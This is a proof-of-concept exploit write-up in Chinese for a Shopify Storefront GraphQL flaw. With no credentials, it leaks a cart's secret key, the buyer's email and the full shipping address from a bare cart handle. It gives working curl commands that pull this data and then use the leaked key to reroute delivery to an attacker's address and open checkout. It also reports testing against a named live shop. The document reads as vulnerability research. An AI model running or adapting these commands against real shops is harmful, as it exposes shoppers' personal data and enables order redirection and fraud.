# Shopify /web/api GraphQL 版本族（graphql.json + dated {2023-01…unstable}）匿名可达：cartPrepareForCompletion 裸 handle 零凭据泄露 key+邮箱+完整收货地址，GET 亦可

- **code**: shopify-web-api-graphql-json-and-dated-version-family-cart-p
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront GraphQL / Checkout Web (/web/api/graphql.json, /web/api/{version}/graphql)
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 21:48–22:00 UTC retro-refresh.com 实测：raw urllib 零 Cookie（请求头无 Cookie/Authorization/会话令牌）POST /web/api/graphql.json，variables.id=gid://shopify/Cart/hWNJ2REzlm96yuCdJzEzJ3W4（裸 handle）→ 200，X-Shopify-Api-Version: 2026-01，正文回显 ?key=842ab94729324bf04675b8030569e0b9、buyerIdentity.email=i9v-victim@example.com、完整收货地址 NineV Victim/12 Sample Street/London/SW1A 9VZ/GB/07911000009；/web/api/2023-01/graphql、/web/api/2024-10/graphql 同样回显（apiver 均压平 2026-01）；GET /web/api/graphql.json?query=... 零 Cookie 同样回显。用回显 key cartDeliveryAddressesAdd(selected=true) 改写收货地址（攻击者地址 selected=true、原地址 selected=false）、cartNoteUpdate 写备注成功；GET /cart/c/{handle}?key=<泄露key> 302 到 shop.app/checkout 携 shop_pay_token；阴性对照 cart(id:裸handle) email=null/地址空。CF DYNAMIC + no-store 无缓存放大。traffic 1794434016-7242 / 1794434025-7461 / 1794433953-6757 / 1794433950-6727。
- **path**: pocs/shopify-web-api-graphql-json-and-dated-version-family-cart-p/poc.md
- **tags**: shopify, storefront, graphql, cart, idor, unauthorized, pii, web-api, graphql.json, dated-version
- **created_at**: 2026-11-11T21:55:46.791Z
- **engine**: https://retro-refresh.com

## 描述

Shopify 店的 /web/api 命名空间除 /web/api/graphql 外，还存在 /web/api/graphql.json 与 /web/api/{2023-01,2024-01,2024-10,2025-04,2026-01,unstable}/graphql 等独立可访问的 Storefront GraphQL 入口；dated 版本段被服务端压平为 2026-01（以响应头 X-Shopify-Api-Version 判定）。与 /api/graphql 同 schema，cartPrepareForCompletion 不校验 cart GID 的 ?key：仅凭 25 位裸 handle 即回显真实 ?key、buyerIdentity.email/phone、完整收货地址；回显 key 可跨会话写 cart（note/地址/配送项），并可直接 GET /cart/c/{handle}?key=... 进入 shop.app 结账。GET 亦可承载该 mutation（query/variables 放 URL）。

## 用法

```
先枚举 /web/api/graphql.json 与 dated /web/api/{version}/graphql 是否匿名可达（响应头 X-Shopify-Api-Version 判断版本压平），再对已知裸 handle 跑 cartPrepareForCompletion 获取 ?key/email/地址，最后用回显 key 做 cartNoteUpdate/cartDeliveryAddressesAdd(selected=true) 与 /cart/c/{handle}?key= 结账跳转验证。全程单线程间隔≥3s。
```

## 正文

```
## 适用与判据
- 目标：Shopify 托管店（Storefront API 匿名可达）。前置：已知目标 cart 的 25 位 handle（不可枚举，需共享链接/日志/页面 JS 等来源）。
- 判据：零 Cookie 请求 `cartPrepareForCompletion(cartId:"gid://shopify/Cart/<handle>")` 返回 200 且 `cart.id` 含 `?key=<real_key>`、`buyerIdentity.email`/`delivery.addresses` 非空 → 成立。
- 同族入口探测方法：对 `/web/api/graphql.json`、`/web/api/{2023-01,2024-01,2024-10,2025-04,2026-01,unstable}/graphql` 逐个发同一 POST；真实入口返回 GraphQL JSON（含 data/errors），不存在返回 404。响应头 `X-Shopify-Api-Version` 可判断 dated 段是否被压平（retro-refresh 全部压平为 2026-01）。

## 最小验证（三步）
```bash
# 1) 零 Cookie 裸 handle → 回显 key/邮箱/地址
curl -sS -X POST 'https://<shop>/web/api/graphql.json' -H 'Content-Type: application/json' --data '{"query":"mutation P($id:ID!){cartPrepareForCompletion(cartId:$id){result{__typename ... on CartStatusReady{cart{id note buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}}} ... on CartStatusNotReady{cart{id note buyerIdentity{email}}}}}}","variables":{"id":"gid://shopify/Cart/<HANDLE>"}}'
# 2) 同族 + GET 承载
curl -sS -X POST 'https://<shop>/web/api/2023-01/graphql' -H 'Content-Type: application/json' --data '<同上 body>'
curl -sS -G 'https://<shop>/web/api/graphql.json' --data-urlencode 'query=<同上 query>' --data-urlencode 'variables={"id":"gid://shopify/Cart/<HANDLE>"}'
# 3) 用回显 key 写（地址改道），随后读回
curl -sS -X POST 'https://<shop>/web/api/graphql.json' -H 'Content-Type: application/json' --data '{"query":"mutation Addr($id:ID!,$a:[CartSelectableAddressInput!]!){cartDeliveryAddressesAdd(cartId:$id,addresses:$a){cart{id delivery{addresses{id selected address{... on CartDeliveryAddress{firstName address1 city zip countryCode phone}}}}} userErrors{field message code}}}","variables":{"id":"gid://shopify/Cart/<HANDLE>?key=<REAL_KEY>","a":[{"address":{"deliveryAddress":{"address1":"666 Redirect Lane","city":"Manchester","countryCode":"GB","firstName":"i9v","lastName":"Attacker","phone":"07911000666","provinceCode":"ENG","zip":"M1 1AA"}},"selected":true}]}}'
# 4) 泄露 key 打开结账入口（302）
curl -sS -o /dev/null -D - 'https://<shop>/cart/c/<HANDLE>?key=<REAL_KEY>'
```

## 关键坑
- 不要用带 cookie jar 的会话做"零凭据"取证：Shopify 首次响应会 Set-Cookie `_shopify_essential/_shopify_analytics/_shopify_marketing`（匿名跟踪 cookie，非凭据），但抓包会显示 Cookie 头，影响"无 Cookie"表述。用 raw urllib / `curl` 单发且不读 cookie 即可。
- `cart(id: <裸handle>)` 的 email/地址仍受 key 门控，阴性对照必须同入口做，否则无法证明泄露点唯一在 `cartPrepareForCompletion`。
- 写 mutation 用裸/错 key 返回 `INVALID "The specified cart does not exist."` 并落新建空白 cart；写路径强制 key，验证链路必须是"prepare 泄 key → 再用 key 写"。
- 所有入口 `Cf-Cache-Status: DYNAMIC` + `Cdn-Cache-Control: no-cache, no-store`，无缓存放大面。
- 影响边界：handle 不可枚举；公开索引源（Wayback/urlscan/sitemap）对 Shopify `/cart/c/` 收录常见为阴性，实际大规模利用依赖 handle 获取渠道。
```
